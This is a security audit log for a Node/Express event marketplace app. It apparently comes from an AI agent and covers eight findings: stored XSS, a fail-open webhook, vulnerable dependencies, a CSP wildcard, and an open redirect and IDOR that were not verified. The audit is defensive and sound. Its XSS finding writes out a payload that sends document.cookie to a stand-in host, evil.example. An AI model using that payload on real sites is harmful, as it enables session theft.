# Security Audit — 2026-09-02

Findings-only log for a future fix PR. No code was changed as part of this audit.

## Scope & method

Manual, targeted review of the tracked codebase (not a full pentest). Three parallel
sub-agent audits (auth/session, input validation/injection, API/infra hardening) were
started but failed early due to an account-wide API rate limit before producing
results — everything below was done directly, by hand, with `grep`/`read`/`npm audit`.

Given that, treat this as a solid first pass, not exhaustive coverage. Areas flagged
below as "needs follow-up" are genuine gaps in this pass, not clean bills of health.

**Known limitation**: this session only has a **shallow git clone** (~78 commits from
2026-08-21 onward). Historical-secret scanning below only covers that window. GitGuardian
(already wired into CI on every push — see `.gitguardian.yml`) scans full history on
GitHub's side and has not alerted; that's the stronger signal for anything older.

---

## Findings, most severe first

### 1. [High] Stored XSS in the shortlist drawer via marketplace listing/supplier/package names

- **File**: `public/assets/js/components/shortlist-drawer.js`, `renderItem()` — the `alt="${item.name}"`
  attribute and `<h3 class="shortlist-item-name">${item.name}</h3>` element both interpolate
  `item.name` directly into an `innerHTML` template string with **no escaping**
  (`render()` assigns the result straight to `content.innerHTML`).
- **Confirmed data flow (not hypothetical)**: `item.name` is populated from fully
  user-supplied content at three call sites — `public/assets/js/marketplace.js:1228`
  (`name: listing.title`, a marketplace listing title anyone can set when creating a
  listing via `/supplier/marketplace-new-listing`), `public/assets/js/pages/package-init.js:344`
  (`name: supplier.name`) and `:461` (`name: pkg.title`), and
  `public/assets/js/pages/suppliers-init.js`/`marketplace-init.js` (similar). **None of
  these pass the value through escaping before calling `shortlistManager.addItem()`.**
- **The escaping convention already exists and is used correctly everywhere else**:
  `marketplace.js` has its own `escapeHtml()` helper and uses it consistently for the exact
  same `listing.title` value when rendering the main listing detail view (lines 510, 518,
  553, 570-571, 575-576) — the shortlist drawer is the one rendering path that was missed.
- **Exploit scenario**: any authenticated user creates a marketplace listing titled e.g.
  `<img src=x onerror=fetch('https://evil.example/steal?c='+document.cookie)>`. Any other
  user (buyer, or an admin reviewing listings) who clicks the shortlist heart on that
  listing and later opens their shortlist drawer executes the payload in their own
  session. Confirmed via `shortlist-manager.js` that shortlist items are synced to the
  server per-user, so this is genuinely **stored** XSS — it persists and re-fires every
  time the victim opens their shortlist until they remove the item.
- **Fix direction**: escape `item.name` (and any other interpolated item field —
  `item.category`, `item.location`, `priceHint`) in `shortlist-drawer.js`'s `renderItem()`
  before interpolating into the template string, using the same `escapeHtml()` pattern
  `marketplace.js` already uses, or switch to building the DOM with `textContent`
  assignments instead of `innerHTML` for user-controlled fields.

### 2. [Medium] Postmark webhook fails **open** when credentials aren't configured, unlike every other webhook in the app

- **File**: `routes/webhooks.js:46-71` (`POST /api/webhooks/postmark`)
- **Issue**: If `POSTMARK_WEBHOOK_USER`/`POSTMARK_WEBHOOK_PASS` aren't set, the handler logs
  `⚠️ WARNING: Webhook authentication not configured in production!` and then **falls
  through and processes the request anyway** (line 68-71, no `return`). Anyone who finds
  the endpoint can POST forged `Delivery`/`Bounce`/`SpamComplaint`/`SubscriptionChange`
  events with no auth at all.
- **Why it matters**: forged `SubscriptionChange` events could unsubscribe arbitrary real
  users from email; forged `Bounce`/`SpamComplaint` events could pollute delivery-health
  tracking or trigger internal suppression logic against a victim's address (a targeted
  denial-of-service on their email delivery).
- **Inconsistency**: every _other_ webhook in this codebase fails **closed** in production —
  Stripe (`routes/payments.js:309-312`, `routes/subscriptions-v2.js:855-856`) and the
  MongoDB Atlas webhook (`webhooks/mongodbWebhookHandler.js:294-301`, which even has the
  comment _"Fail closed in production: never process unsigned webhooks"_) both hard-reject
  with a 400 if their secret is unset. Postmark is the one exception.
- **Fix direction**: mirror the Stripe/MongoDB pattern — `if (!webhookUser || !webhookPass) { if (NODE_ENV === 'production') return res.status(401)...; else warn-and-continue; }`.

### 3. [High, no upstream fix] `xlsx` (SheetJS) — two known high-severity CVEs, dependency abandoned on npm

- **File**: `package.json:149` (`"xlsx": "^0.18.5"`), used in export/import features.
- **CVEs**: Prototype Pollution ([GHSA-4r6h-8v6p-xvw6](https://github.com/advisories/GHSA-4r6h-8v6p-xvw6)),
  ReDoS ([GHSA-5pgg-2g8v-p4x9](https://github.com/advisories/GHSA-5pgg-2g8v-p4x9)). `npm audit`
  reports `fixAvailable: false` — SheetJS stopped publishing patched releases to npm; fixes
  only ship via their own CDN.
- **Mitigating factor already in the codebase**: `.env.example` documents
  `DISABLE_XLSX_EXPORT=true` to disable XLSX export and fall back to CSV in hardened
  environments — worth confirming this is actually set in production, or better, replacing
  the dependency.
- **Fix direction**: either (a) migrate to SheetJS's CDN-distributed patched build per their
  own advisory, (b) switch to a maintained alternative (e.g. `exceljs`), or (c) confirm
  `DISABLE_XLSX_EXPORT=true` in production and accept CSV-only export as the interim mitigation.

### 4. [Moderate] `@sentry/node` + transitive OpenTelemetry instrumentation packages — 19 moderate advisories, fix requires a major bump

- **File**: `package.json:75` (`"@sentry/node": "^8.0.0"`)
- **Detail**: `npm audit` flags 19 moderate-severity advisories across
  `@opentelemetry/instrumentation-*`, `@opentelemetry/core`, `@opentelemetry/resources`,
  `@sentry/opentelemetry`, `@prisma/instrumentation`, all pulled in transitively by
  `@sentry/node`. Fix is available but is semver-major: `@sentry/node@10.73.0`.
- **Fix direction**: schedule a Sentry v8→v10 upgrade (check their migration guide — likely
  touches `utils/sentry.js` / `sentry-browser-init.js` init code) and re-run `npm audit`
  to confirm the whole subtree clears.

### 5. [Low] Legacy pre-migration data files still tracked in git

- **Files**: `data/audit_logs.json`, `data/messages.json`, `data/notes.json`,
  `data/packages.json`, `data/photos.json`, `data/reports.json`, `data/reviews.json`,
  `data/search_history.json`, `data/suppliers.json`, `data/threads.json`
- **Detail**: `.gitignore` excludes `data/*.json` going forward, but these were committed
  before that rule existed, so they're still tracked. Confirmed by content inspection: this
  is synthetic/seed data from the pre-MongoDB local file-store era (repeated fake reviewer
  names cycling "Sarah M." / "James & Emily" / "Rachel T.", placeholder `@supplier.com`
  emails), **not real customer PII**, and `db-unified.js` shows no code path still reads
  this file store — it's vestigial.
- **Fix direction**: `git rm --cached data/*.json` (keep `uk-cities.json` and `sample/`,
  which are explicitly allowlisted as real reference data) for repo hygiene. Low risk, but
  free to fix and reduces the historical-secret-scanning surface for future audits.

### 6. [Low] CSP `connect-src` (and `img-src`/`media-src`) include a broad `https:` wildcard

- **File**: `middleware/security.js:108-141` (`configureHelmet`)
- **Detail**: `connectSrc` includes `'https:'` alongside the specific allowlisted hosts
  (Stripe, Google, PostHog, Cloudflare, etc.), meaning page JS can `fetch()`/XHR/WebSocket
  to _any_ HTTPS host, not just the intended ones. Same pattern on `imgSrc`/`mediaSrc`
  (lower risk there — image/media loads can't execute script or read the response).
- **Why it matters**: this doesn't create a vulnerability on its own, but it meaningfully
  weakens CSP's value as _defense-in-depth_ — if an XSS were ever found elsewhere, the
  attacker's injected script could exfiltrate data to any HTTPS endpoint instead of being
  blocked by CSP.
- **Fix direction**: narrow `connectSrc` to the specific hosts already itemized in the same
  list (Stripe, Google, PostHog, Cloudflare, TidyCal) and drop the `'https:'` wildcard;
  requires checking nothing else legitimately needs it first.

### 7. [Info / needs follow-up] Open-redirect on `/auth?redirect=...` not confirmed either way

- **Context**: this pattern is used across the app (e.g. marketplace's "Create new listing"
  CTA: `/auth?redirect=%2Fsupplier%2Fmarketplace-new-listing`). Server-side `routes/auth.js`
  has no `res.redirect` using this param, so the redirect is handled client-side, but I
  could not locate the specific JS file that reads `?redirect=` and performs the navigation
  in the time available this pass (it isn't in any of the `public/assets/js/pages/auth-*.js`
  / `auth-*.js` files I checked).
- **Risk if unvalidated**: an attacker could craft `/auth?redirect=https://evil-lookalike.com`
  and, after a real login, silently send the victim to a phishing page.
- **Fix direction**: find the post-login redirect handler and confirm it only accepts a
  same-origin relative path (e.g. starts with `/` and not `//`) before navigating; this needs
  a dedicated follow-up look, not assumed broken or assumed fine.

### 8. [Info / needs follow-up] Messaging/thread authorization (IDOR) not directly verified

- **Context**: I could not locate the current messaging/threads REST route file by name in
  this pass (`routes/messaging-v2.js` appears to have been renamed/refactored — only a
  gitignored `.backup` reference remains) and ran out of budget tracing it through
  `websocket-server-v2.js` instead. By contrast, **marketplace listing ownership is
  confirmed correct**: `routes/marketplace.js:366,703,819` all check
  `listing.userId !== req.user.id && req.user.role !== 'admin'` before allowing
  edit/delete.
- **Fix direction**: whoever picks this up should specifically verify that fetching/replying
  to a message thread checks `req.user.id` is a participant (`customerId` or the thread's
  supplier-owning user) before returning/mutating it — this is the single highest-value IDOR
  check left undone by this pass, since private messages are the most sensitive
  user-to-user data in the app.

---

## Verified OK (checked, not skipped — no need to re-check unless something changes nearby)

- **No real secrets in tracked files or the available (shallow) git history.** Searched for
  Stripe (`sk_live_`/`sk_test_`/`whsec_`), AWS (`AKIA...`), Google (`AIza...`), GitHub
  (`ghp_`/`github_pat_`), Slack (`xox...`), SendGrid (`SG....`), private key blocks, and
  MongoDB URIs with embedded credentials — every match was a documented placeholder
  (`.env.example`, `docs/`) or an obviously-fake test value (`TESTUSER:TESTPASS`,
  `validpassword`). `.env` is gitignored; only `.env.example` is tracked and contains no
  real values.
- **GitGuardian is live in CI** (`.gitguardian.yml`) with only two narrow, verified-legitimate
  exclusions (test helper files with fake creds; one caps-lock-detection UI false positive).
- **No hardcoded API keys in client-side JS** — Stripe publishable key is fetched at runtime
  via `/api/payments/config`, not baked into static files.
- **JWT_SECRET fallback (`'change_me'`) is guarded, not exploitable.** `server.js:236-249`
  unconditionally `process.exit(1)`s (any environment) if the secret is missing, a known
  placeholder, or under 32 chars; `middleware/auth.js` and `utils/token.js` add their own
  production-specific hard-fail checks too. The app cannot boot with the insecure default.
- **Password hashing**: bcryptjs, cost factor 10 (acceptable). One low-cost (4) hash is used
  only in `routes/e2e-test-support.js`'s test-fixture seeding — see below, this route can't
  run in production.
- **`routes/e2e-test-support.js` is triple-gated**, effectively unreachable outside CI:
  requires `NODE_ENV === 'test'` AND `E2E_MODE === 'full'` to even be mounted
  (`routes/static.js:31-33`), AND the router itself requires a fixed private header
  (`x-eventflow-e2e: backend-suite`) per request.
- **Auth cookies**: `httpOnly: true` always, `sameSite: 'lax'`, `secure` correctly gated to
  production (`middleware/auth.js:43-47,70-72,92-94`).
- **Rate limiting on auth is comprehensive**: distinct named limiters
  (`strictAuthLimiter`, `passwordResetLimiter`, `registrationLimiter`, `tokenLinkLimiter`,
  `authLimiter`) are applied across login, 2FA, forgot-password, reset-password, register,
  email verification, resend-verification, and change-password (`routes/auth.js`).
- **NoSQL injection defense is wired globally**: `express-mongo-sanitize` is applied via
  `middleware/sanitize.js` → `app.use(configureSanitization())` in `server.js:360`
  (confirmed, not just present in `package.json` unused), covering `req.body`/`query`/`params`.
  A second custom middleware strips null bytes from the same three sources
  (`server.js:361`).
- **CORS is a real allowlist, not a wildcard.** `middleware/security.js:225-326` — origin
  checked against `BASE_URL` + `ALLOWED_ORIGINS` + (production only) the two canonical
  `event-flow.co.uk` origins; rejects with 403 in production, warns-but-allows in dev only.
  `credentials: true` is safe here specifically because it's paired with this strict
  allowlist, not a wildcard.
- **Security headers are strong overall**: Helmet-configured CSP with `frame-ancestors: 'none'`,
  `object-src: 'none'`, `script-src` locked to `'self'` + an explicit host allowlist (the two
  legacy inline scripts are pinned by exact SHA-256 hash rather than weakened with
  `'unsafe-inline'` — good practice), HSTS in production only, `X-Frame-Options: deny`,
  `X-Content-Type-Options: nosniff`, a path-aware `Permissions-Policy` (geolocation only on
  `/marketplace`). See finding #5 above for the one weak spot (`connect-src`/`img-src`
  wildcards).
- **HTTPS/canonical-host redirect logic doesn't reflect arbitrary Host headers** —
  `middleware/security.js:413-443` only redirects to a known, hardcoded canonical origin,
  and only for requests whose `Host` header matches one of the two known production hosts;
  unknown hosts pass through unredirected rather than being reflected (avoids a host-header
  open-redirect).
- **Stripe and MongoDB Atlas webhooks fail closed in production** if their signing secret
  is unset (see finding #2 for the one webhook that doesn't).
- **No hardcoded secrets in `railway.json`/`railway.worker.json`/`Procfile`/`docker-compose.yml`**
  (the latter has a hardcoded _local-dev-only_ Mongo password, `eventflow_password` —
  fine, since production uses `MONGODB_URI` pointing at Atlas, not this file).
- **No secrets hardcoded in `.github/workflows/*.yml`** — everything sensitive there
  correctly references `${{ secrets.* }}`.

---

## Suggested order of work for the fix PR

1. Fix the stored XSS in `shortlist-drawer.js` (#1) — small, isolated, highest-severity, highest-confidence fix.
2. Postmark webhook fail-open (#2) — small, isolated, high-confidence fix.
3. Confirm/set `DISABLE_XLSX_EXPORT=true` in production while evaluating an `xlsx` replacement (#3).
4. Trace and confirm (or fix) the messaging-thread IDOR question (#8) — highest-value unknown.
5. Trace and confirm (or fix) the `/auth?redirect=` open-redirect question (#7).
6. `git rm --cached` the legacy `data/*.json` files (#5) — trivial, no functional impact.
7. Narrow CSP `connect-src` (#6) — needs a bit of manual verification nothing else relies on the wildcard.
8. Plan the `@sentry/node` v8→v10 upgrade (#4) — larger, needs its own testing pass.
